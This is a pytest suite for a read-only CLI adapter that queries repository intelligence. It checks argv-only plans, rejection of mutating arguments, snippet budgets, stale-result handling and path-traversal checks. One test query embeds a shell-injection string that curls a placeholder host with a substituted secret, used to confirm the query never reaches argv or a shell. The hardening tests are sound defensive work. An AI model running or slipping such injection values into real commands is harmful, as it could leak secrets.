from __future__ import annotations

import json
from pathlib import Path

import pytest
from pydantic import ValidationError

from harness.repo import (
    CliOperationCommand,
    EvidenceCompleteness,
    IntelligenceOperation,
    IntelligenceReadiness,
    ReadOnlyCliBackendConfig,
    ReadOnlySemanticCliAdapter,
    RepositoryIntelligenceQuery,
    SemanticBackendDisabledError,
    UnsupportedSemanticOperationError,
)


def _config(
    *,
    enabled: bool = True,
    max_evidence: int = 50,
    max_total_snippet_chars: int = 16_384,
) -> ReadOnlyCliBackendConfig:
    return ReadOnlyCliBackendConfig(
        backend="moderne-wrapper",
        executable="/opt/operator/bin/repository-intelligence",
        commands=(
            CliOperationCommand(
                operation=IntelligenceOperation.SEARCH,
                arguments=("query", "--stdin-json"),
            ),
            CliOperationCommand(
                operation=IntelligenceOperation.REFERENCES,
                arguments=("references", "--stdin-json"),
            ),
        ),
        enabled=enabled,
        max_evidence=max_evidence,
        max_total_snippet_chars=max_total_snippet_chars,
    )


def _query(*, limit: int = 20) -> RepositoryIntelligenceQuery:
    return RepositoryIntelligenceQuery(
        operation=IntelligenceOperation.SEARCH,
        text="where authorization decisions are made",
        limit=limit,
    )


def _response(
    plan_query_sha256: str,
    *,
    fingerprint: str = "tree:abc123",
    evidence: list[dict[str, object]] | None = None,
    completeness: str = "complete",
    omitted_count: int = 0,
) -> str:
    return json.dumps(
        {
            "backend_version": "2026.8",
            "completeness": completeness,
            "contract_version": 1,
            "evidence": evidence or [],
            "omitted_count": omitted_count,
            "query_sha256": plan_query_sha256,
            "readiness": "ready",
            "repository_fingerprint": fingerprint,
        },
        sort_keys=True,
    )


def test_backend_is_disabled_by_default_and_never_probes(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config(enabled=False))
    status = adapter.status("tree:abc123")

    assert status.readiness is IntelligenceReadiness.DISABLED
    assert status.enabled is False
    assert status.current is False
    with pytest.raises(SemanticBackendDisabledError):
        adapter.plan(
            _query(),
            repository_root=tmp_path,
            repository_fingerprint="tree:abc123",
        )


def test_plan_is_deterministic_argv_only_and_keeps_query_out_of_argv(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = RepositoryIntelligenceQuery(
        operation=IntelligenceOperation.SEARCH,
        text="symbol; curl https://example.invalid/$(secret)",
        path="src/app.py",
        limit=7,
    )

    first = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    second = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )

    assert first == second
    assert first.sha256 == second.sha256
    assert first.argv == (
        "/opt/operator/bin/repository-intelligence",
        "query",
        "--stdin-json",
    )
    assert query.text not in first.argv
    assert first.shell is False
    assert first.network_allowed is False
    assert first.inherit_environment is False
    assert first.environment == (("LANG", "C"), ("LC_ALL", "C"))
    assert json.loads(first.stdin_json) == {
        "contract_version": 1,
        "query": {
            "limit": 7,
            "operation": "search",
            "path": "src/app.py",
            "text": "symbol; curl https://example.invalid/$(secret)",
        },
        "repository_fingerprint": "tree:abc123",
    }


def test_plan_rejects_unapproved_operations_and_relative_roots(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    with pytest.raises(UnsupportedSemanticOperationError):
        adapter.plan(
            RepositoryIntelligenceQuery(
                operation=IntelligenceOperation.IMPLEMENTATIONS,
                text="CommandPolicy",
            ),
            repository_root=tmp_path,
            repository_fingerprint="tree:abc123",
        )
    with pytest.raises(ValueError, match="repository_root must be absolute"):
        adapter.plan(
            _query(),
            repository_root=Path("repo"),
            repository_fingerprint="tree:abc123",
        )


@pytest.mark.parametrize(
    "arguments",
    [
        ("search", "--write"),
        ("fix",),
        ("search", "--output=result.json"),
    ],
)
def test_config_rejects_mutating_cli_arguments(arguments: tuple[str, ...]) -> None:
    with pytest.raises(ValidationError, match="mutating CLI argument"):
        ReadOnlyCliBackendConfig(
            backend="unsafe-wrapper",
            executable="/opt/operator/bin/unsafe",
            commands=(
                CliOperationCommand(
                    operation=IntelligenceOperation.SEARCH,
                    arguments=arguments,
                ),
            ),
        )


def test_config_requires_absolute_executable_and_unique_operations() -> None:
    command = CliOperationCommand(
        operation=IntelligenceOperation.SEARCH,
        arguments=("search",),
    )
    with pytest.raises(ValidationError, match="absolute path"):
        ReadOnlyCliBackendConfig(
            backend="lsp-wrapper",
            executable="bin/lsp-wrapper",
            commands=(command,),
        )
    with pytest.raises(ValidationError, match="only once"):
        ReadOnlyCliBackendConfig(
            backend="lsp-wrapper",
            executable="/opt/operator/bin/lsp-wrapper",
            commands=(command, command),
        )


def test_parse_result_orders_evidence_and_records_provenance(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = _query()
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    stdout = _response(
        query.sha256,
        evidence=[
            {
                "end_line": 18,
                "kind": "method",
                "path": "src/z.py",
                "score": 0.7,
                "snippet": "def authorize(...): ...",
                "start_line": 12,
                "symbol": "Policy.authorize",
            },
            {
                "end_line": 44,
                "kind": "class",
                "path": "src/a.py",
                "score": 0.9,
                "snippet": "class CommandPolicy: ...",
                "start_line": 20,
                "symbol": "CommandPolicy",
            },
        ],
    )

    result = adapter.parse_result(plan, stdout)

    assert result.status.current is True
    assert result.completeness is EvidenceCompleteness.COMPLETE
    assert result.truncated is False
    assert [item.path for item in result.evidence] == ["src/a.py", "src/z.py"]
    assert all(item.provenance == result.provenance for item in result.evidence)
    assert result.provenance.repository_fingerprint == "tree:abc123"
    assert result.provenance.query_sha256 == query.sha256
    assert len(result.sha256) == 64


def test_parse_result_enforces_count_and_total_snippet_budgets(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(
        _config(max_evidence=2, max_total_snippet_chars=5)
    )
    query = _query(limit=3)
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    evidence = [
        {
            "end_line": index,
            "kind": "function",
            "path": f"src/{index}.py",
            "score": score,
            "snippet": "abcdefgh",
            "start_line": index,
            "symbol": f"f{index}",
        }
        for index, score in [(1, 0.9), (2, 0.8), (3, 0.7)]
    ]

    result = adapter.parse_result(plan, _response(query.sha256, evidence=evidence))

    assert result.completeness is EvidenceCompleteness.PARTIAL
    assert result.truncated is True
    assert result.omitted_count == 1
    assert len(result.evidence) == 2
    assert [item.snippet for item in result.evidence] == ["abcde", ""]


def test_stale_response_never_publishes_evidence(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = _query()
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:new",
    )
    stdout = _response(
        query.sha256,
        fingerprint="tree:old",
        evidence=[
            {
                "end_line": 1,
                "kind": "function",
                "path": "src/stale.py",
                "score": 1.0,
                "snippet": "old()",
                "start_line": 1,
                "symbol": "old",
            }
        ],
    )

    result = adapter.parse_result(plan, stdout)

    assert result.status.readiness is IntelligenceReadiness.STALE
    assert result.evidence == ()
    assert result.completeness is EvidenceCompleteness.UNKNOWN
    assert result.truncated is True
    assert result.omitted_count == 1


def test_parser_rejects_wrong_query_invalid_paths_and_oversize_output(tmp_path: Path) -> None:
    adapter = ReadOnlySemanticCliAdapter(_config())
    query = _query()
    plan = adapter.plan(
        query,
        repository_root=tmp_path,
        repository_fingerprint="tree:abc123",
    )
    wrong_query = _response("0" * 64)
    with pytest.raises(ValueError, match="does not match"):
        adapter.parse_result(plan, wrong_query)

    invalid_path = _response(
        query.sha256,
        evidence=[
            {
                "end_line": 1,
                "kind": "function",
                "path": "../outside.py",
                "score": 1.0,
                "start_line": 1,
            }
        ],
    )
    with pytest.raises(ValidationError, match="normalized relative paths"):
        adapter.parse_result(plan, invalid_path)

    with pytest.raises(ValueError, match="exceeds"):
        adapter.parse_result(plan, b"{" + b" " * plan.max_stdout_bytes + b"}")


def test_contracts_are_frozen() -> None:
    query = _query()
    with pytest.raises(ValidationError, match="frozen"):
        query.limit = 99  # type: ignore[misc]
